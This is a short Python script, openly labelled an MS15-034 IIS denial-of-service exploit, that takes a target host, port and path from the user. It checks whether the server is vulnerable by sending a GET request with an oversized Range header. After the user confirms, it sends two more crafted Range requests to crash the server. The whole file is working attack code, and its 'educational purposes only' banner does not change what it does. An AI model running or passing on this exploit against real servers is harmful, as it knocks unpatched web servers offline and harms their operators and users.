import socket
import sys

print('*****************************************')
print('*    MS15-034 IIS Active DoS Exploit    *')
print('* ------------------------------------- *')
print('*        Written by David Jura          *')
print('*     http://github.com/davidjura       *')
print('* ------------------------------------- *')
print('*  This script is intended to be used   *')
print('*    for educational purposes ONLY      *')
print('* ------------------------------------- *')
print('*  ! DO NOT USE FOR ILLEGAL PURPOSES !  *')
print('*****************************************\n')

def exploit(host,port,path):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((host,port))
    except:
        print("[-] Server Appears To Be Offline...")
        exit(1)
    s.send(("GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nRange: bytes=0-18446744073709551615\r\n\r\n").encode())
    resp = s.recv(1024)
    if str(resp).find("404") != -1:
        print("[-] Target Path On Server Does Not Exist!")
        exit(1)
    if str(resp).find("Requested Range Not Satisfiable") == -1:
        print("[-] Server Doesn't Appear To Be Vulnerable!")
        exit(1)
    else:
        if str(input("[*] Server is Vulnerable! Would you like to run the exploit? (y/n): ")).lower() == 'y':
            s.send(("GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nRange: bytes=18-18446744073709551615\r\n\r\n").encode())
            s.send(("GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nRange: bytes=18-18446744073709551615\r\n\r\n").encode())
            print("[*] Exploit has been sent!")
            exit(0);
try:
    input = raw_input
except NameError:
    pass

host = str(input("Enter The hostname/IP (example.com or 127.0.0.1): "))
port = int(input("Enter Server Port (80 by default): "))
path = str(input("Enter The Target Path (/welcome.png): "))

exploit(host,port,path)
